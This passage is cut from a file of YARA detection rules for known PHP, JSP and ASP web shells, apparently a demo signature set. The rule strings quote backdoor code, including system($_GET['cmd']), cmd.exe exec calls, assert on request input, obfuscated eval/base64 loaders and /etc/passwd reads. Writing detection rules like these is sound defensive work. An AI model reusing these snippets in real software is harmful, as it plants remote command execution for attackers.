minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"out.println(\\\"Command: \\\" + request.getParameter(\\\"cmd\\\") + \\\"<BR>\\\");\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_jsp_k81_RID2D26 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file k81.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:19:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);\" fullword\n      $s9 = \"if(cmd.equals(\\\"Szh0ZWFt\\\")){out.print(\\\"[S]\\\"+dir+\\\"[E]\\\");}\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_ASP_zehir_RID2E0B : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file zehir.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:57:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"Response.Write \\\"<font face=wingdings size=3><a href='\\\"&dosyaPath&\\\"?status=18&\" \n   condition: \n      all of them\n}\n\nrule Webshell_Worse_Linux_Shell_1_RID320C : DEMO LINUX SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Worse Linux Shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:48:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, LINUX, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"system(\\\"mv \\\".$_FILES['_upl']['tmp_name'].\\\" \\\".$currentWD\" \n   condition: \n      all of them\n}\n\nrule Webshell_zacosmall_RID2E6C : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file zacosmall.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:13:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\\\"</strong><hr>\" \n   condition: \n      all of them\n}\n\nrule Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_RID41E9 : DEMO EXPLOIT SCRIPT T1087_001 T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 01:05:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, SCRIPT, T1087_001, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<option value=\\\"cat /etc/passwd\\\">/etc/passwd</option>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_redirect_RID2DF8 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file redirect.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:54:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"var flag = \\\"?txt=\\\" + (document.getElementById(\\\"dl\\\").checked ? \\\"2\\\":\\\"1\\\" \" \n   condition: \n      all of them\n}\n\nrule Webshell_jsp_cmdjsp_RID2ED3 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmdjsp.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:31:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"<FORM METHOD=GET ACTION='cmdjsp.jsp'>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_Java_Shell_RID2E7F : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Java Shell.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:17:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"public JythonShell(int columns, int rows, int scrollback) {\" fullword\n      $s9 = \"this(null, Py.getSystemState(), columns, rows, scrollback);\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_asp_1d_RID2CDE : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 1d.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:07:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"+9JkskOfKhUxZJPL~\\\\(mD^W~[,{@#@&EO\" \n   condition: \n      all of them\n}\n\nrule Webshell_jsp_IXRbE_RID2DEC : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file IXRbE.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:52:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%if(request.getParameter(\\\"f\\\")!=null)(new java.io.FileOutputStream(application\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHP_G5_RID2C69 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file G5.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:48:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"echo \\\"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHP_r57142_RID2D62 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file r57142.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:29:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_jsp_tree_RID2E02 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file tree.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:56:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"$('#tt2').tree('options').url = \\\"selectChild.action?checki\" \n      $s6 = \"String basePath = request.getScheme()+\\\"://\\\"+request.getServerName()+\\\":\\\"+requ\" \n   condition: \n      all of them\n}\n\nrule Webshell_C99madShell_v_3_0_smowu_RID3315 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file smowu.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:32:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"<tr><td width=\\\"50%\\\" height=\\\"1\\\" valign=\\\"top\\\"><center><b>:: Enter ::</b><for\" \n      $s8 = \"<p><font color=red>Wordpress Not Found! <input type=text id=\\\"wp_pat\\\"><input ty\" \n   condition: \n      1 of them\n}\n\nrule Webshell_simple_backdoor_RID30D4 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file simple-backdoor.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:56:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$cmd = ($_REQUEST['cmd']);\" fullword\n      $s1 = \"if(isset($_REQUEST['cmd'])){\" fullword\n      $s4 = \"system($cmd);\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_PHP_404_b_RID2D46 : DEMO SCRIPT T1087_001 T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 404.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:24:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1087_001, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"<span>Posix_getpwuid (\\\"Read\\\" /etc/passwd)\" \n   condition: \n      all of them\n}\n\nrule Webshell_Macker_s_Private_PHPShell_RID3444 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Macker's Private PHPShell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:23:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"echo \\\"<tr><td class=\\\\\\\"silver border\\\\\\\">&nbsp;<strong>Server's PHP Version:&n\" \n      $s4 = \"&nbsp;&nbsp;<?php echo buildUrl(\\\"<font color=\\\\\\\"navy\\\\\\\">[\" \n      $s7 = \"echo \\\"<form action=\\\\\\\"$SFileName?$urlAdd\\\\\\\" method=\\\\\\\"POST\\\\\\\"><input type=\" \n   condition: \n      all of them\n}\n\nrule Webshell_Antichat_Shell_v1_3_2_RID3252 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Antichat Shell v1.3.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:00:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"$header='<html><head><title>'.getenv(\\\"HTTP_HOST\\\").' - Antichat Shell</title><m\" \n   condition: \n      all of them\n}\n\nrule Webshell_Safe_mode_breaker_RID3164 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Safe mode breaker.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:20:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"preg_match(\\\"/SAFE\\\\ MODE\\\\ Restriction\\\\ in\\\\ effect\\\\..*whose\\\\ uid\\\\ is(\" \n      $s6 = \"$path =\\\"{$root}\\\".((substr($root,-1)!=\\\"/\\\") ? \\\"/\\\" : NULL).\" \n   condition: \n      1 of them\n}\n\nrule Webshell_Sst_Sheller_RID2F0E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Sst-Sheller.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:40:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo \\\"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>\" \n      $s3 = \"<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHPJackal_v1_5_RID2F6E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file PHPJackal v1.5.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:56:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"echo \\\"<center>${t}MySQL cilent:</td><td bgcolor=\\\\\\\"#333333\\\\\\\"></td></tr><form\" \n      $s8 = \"echo \\\"<center>${t}Wordlist generator:</td><td bgcolor=\\\\\\\"#333333\\\\\\\"></td></tr\" \n   condition: \n      all of them\n}\n\nrule Webshell_customize_RID2E89 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file customize.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:18:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"String cs = request.getParameter(\\\"z0\\\")==null?\\\"gbk\\\": request.getParameter(\\\"z\" \n   condition: \n      all of them\n}\n\nrule Webshell_jsp_list_RID2E0E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file list.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:58:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<FORM METHOD=\\\"POST\\\" NAME=\\\"myform\\\" ACTION=\\\"\\\">\" fullword\n      $s2 = \"out.print(\\\") <A Style='Color: \\\" + fcolor.toString() + \\\";' HRef='?file=\\\" + fn\" \n      $s7 = \"if(flist[i].canRead() == true) out.print(\\\"r\\\" ); else out.print(\\\"-\\\");\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_s72_Shell_v1_1_Coding_RID3222 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file s72 Shell v1.1 Coding.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:52:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"<font face=\\\"Verdana\\\" style=\\\"font-size: 8pt\\\" color=\\\"#800080\\\">Buradan Dosya \" \n   condition: \n      all of them\n}\n\nrule Webshell_jsp_sys3_RID2DE4 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file sys3.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:51:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<input type=\\\"submit\\\" name=\\\"btnSubmit\\\" value=\\\"Upload\\\">\" fullword\n      $s4 = \"String path=new String(request.getParameter(\\\"path\\\").getBytes(\\\"ISO-8859-1\\\"\" \n      $s9 = \"<%@page contentType=\\\"text/html;charset=gb2312\\\"%>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_jsp_guige02_RID2EC5 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file guige02.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:28:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\\\"#fff\" \n      $s1 = \"<%@page contentType=\\\"text/html; charset=GBK\\\" import=\\\"java.io.*;\\\"%><%!private\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_ghost_RID2E72 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ghost.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:14:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'\" \n      $s6 = \"//<img width=1 height=1 src=\\\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***\" \n      $s7 = \"preg_replace('\\\\'a\\\\'eis','e'.'v'.'a'.'l'.'(KmU(\\\"\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_WinX_Shell_RID2E83 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file WinX Shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:17:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"print \\\"<font face=\\\\\\\"Verdana\\\\\\\" size=\\\\\\\"1\\\\\\\" color=\\\\\\\"#990000\\\\\\\">Filenam\" \n      $s8 = \"print \\\"<font face=\\\\\\\"Verdana\\\\\\\" size=\\\\\\\"1\\\\\\\" color=\\\\\\\"#990000\\\\\\\">File: </\" \n   condition: \n      all of them\n}\n\nrule Webshell_Crystal_Crystal_RID30C9 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Crystal.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:54:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"show opened ports</option></select><input type=\\\"hidden\\\" name=\\\"cmd_txt\\\" value\" \n      $s6 = \"\\\" href=\\\"?act=tools\\\"><font color=#CC0000 size=\\\"3\\\">Tools</font></a></span></f\" \n   condition: \n      all of them\n}\n\nrule Webshell_asp_ajn_RID2D82 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ajn.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:34:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"seal.write \\\"Set WshShell = CreateObject(\\\"\\\"WScript.Shell\\\"\\\")\\\" & vbcrlf\" fullword\n      $s6 = \"seal.write \\\"BinaryStream.SaveToFile \\\"\\\"c:\\\\downloaded.zip\\\"\\\", adSaveCreateOve\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_cmd_RID2D81 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:34:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if($_GET['cmd']) {\" fullword\n      $s1 = \"// cmd.php = Command Execution\" fullword\n      $s7 = \"  system($_GET['cmd']);\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_asp_list_RID2E05 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file list.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:56:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<INPUT TYPE=\\\"hidden\\\" NAME=\\\"type\\\" value=\\\"<%=tipo%>\\\">\" fullword\n      $s4 = \"Response.Write(\\\"<h3>FILE: \\\" & file & \\\"</h3>\\\")\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_r57_1_4_0_RID2D36 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file r57.1.4.0.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:22:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"@ini_set('error_log',NULL);\" fullword\n      $s6 = \"$pass='abcdef1234567890abcdef1234567890';\" fullword\n      $s7 = \"@ini_restore(\\\"disable_functions\\\");\" fullword\n      $s9 = \"@ini_restore(\\\"safe_mode_exec_dir\\\");\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_PHP_co_RID2CBF : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file co.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:02:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV\" fullword\n      $s11 = \"6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_PHP_150_RID2C83 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 150.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:52:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"HJ3HjqxclkZfp\" \n      $s1 = \"<? eval(gzinflate(base64_decode('\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_jsp_cmdjsp_2_RID2F64 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmdjsp.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:55:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Process p = Runtime.getRuntime().exec(\\\"cmd.exe /C \\\" + cmd);\" fullword\n      $s4 = \"<FORM METHOD=GET ACTION='cmdjsp.jsp'>\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_PHP_c37_RID2CBA : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file c37.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:01:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),\" \n      $s9 = \"++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHP_b37_RID2CB9 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file b37.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:01:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_backdoor_RID2F92 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file php-backdoor.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:02:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))\" fullword\n      $s2 = \"<pre><form action=\\\"<? echo $PHP_SELF; ?>\\\" METHOD=GET >execute command: <input \" \n   condition: \n      all of them\n}\n\nrule Webshell_asp_dabao_RID2E40 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file dabao.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:06:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \" Echo \\\"<input type=button name=Submit onclick=\\\"\\\"document.location =&#039;\\\" &\" \n      $s8 = \" Echo \\\"document.Frm_Pack.FileName.value=\\\"\\\"\\\"\\\"+year+\\\"\\\"-\\\"\\\"+(month+1)+\\\"\\\"-\" \n   condition: \n      all of them\n}\n\nrule Webshell_php_2_RID2C7F : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 2.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:51:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php assert($_REQUEST[\\\"c\\\"]);?> \" fullword\n   condition: \n      all of them\n}\n\nrule 